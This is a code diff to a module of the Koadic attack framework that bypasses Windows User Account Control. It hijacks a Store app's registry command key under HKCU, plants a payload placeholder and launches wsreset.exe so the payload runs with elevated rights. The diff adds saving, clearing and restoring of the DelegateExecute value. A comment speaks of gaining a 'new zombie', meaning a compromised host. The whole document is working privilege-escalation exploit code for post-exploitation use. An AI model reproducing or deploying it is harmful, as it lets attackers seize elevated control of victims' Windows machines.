@@ -1,4 +1,3 @@
-
 try
 {
     var consentpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
@@ -10,19 +9,16 @@ try
     }
 
     var path = "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command";
+    var delegate = Koadic.registry.read(Koadic.registry.HKCU, path, 'DelegateExecute', Koadic.registry.STRING).SValue;
+    Koadic.registry.write(Koadic.registry.HKCU, path, 'DelegateExecute', '', Koadic.registry.STRING);
     Koadic.registry.write(Koadic.registry.HKCU, path, '', '~PAYLOAD_DATA~', Koadic.registry.STRING);
 
-    Koadic.shell.run("C:\\Windows\\System32\\wsreset.exe", true);
+    Koadic.shell.run("C:\\Windows\\System32\\wsreset.exe", false);
 
     Koadic.work.report("Completed");
-    // It's slow, if we clean up we don't get the new zombie!!!!!
-    // var now = new Date().getTime();
-    // while (new Date().getTime() < now + 30000);
 
-    // if (Koadic.registry.destroy(Koadic.registry.HKCU, path, "") != 0)
-    // {
-    //     Koadic.shell.run("reg delete HKCU\\"+path+" /f", true);
-    // }
+    Koadic.registry.write(Koadic.registry.HKCU, path, 'DelegateExecute', delegate, Koadic.registry.STRING);
+    Koadic.registry.write(Koadic.registry.HKCU, path, '', '', Koadic.registry.STRING);
 }
 catch (e)
 {
